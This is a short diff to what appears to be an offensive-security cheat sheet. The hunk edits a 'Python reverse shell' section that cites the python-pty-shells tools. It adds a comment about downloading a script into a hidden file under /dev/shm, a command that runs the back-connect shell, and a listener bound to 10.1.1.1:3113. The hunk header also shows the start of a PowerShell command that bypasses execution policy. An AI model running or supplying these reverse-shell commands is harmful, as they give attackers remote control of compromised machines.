@@ -140,10 +140,12 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Windo
 
 ### Python reverse shell
 ### https://github.com/infodox/python-pty-shells
-python tcp_pty_shell_handler.py	-b 10.1.1.1:3113
+### wget path -O /dev/shm/.file.py
 
-### shell, change ip and port
-tcp_pty_backconnect.py	
+python tcp_pty_backconnect.py
+
+### Listener shell, change ip and port
+python tcp_pty_shell_handler.py	-b 10.1.1.1:3113
 
 
 
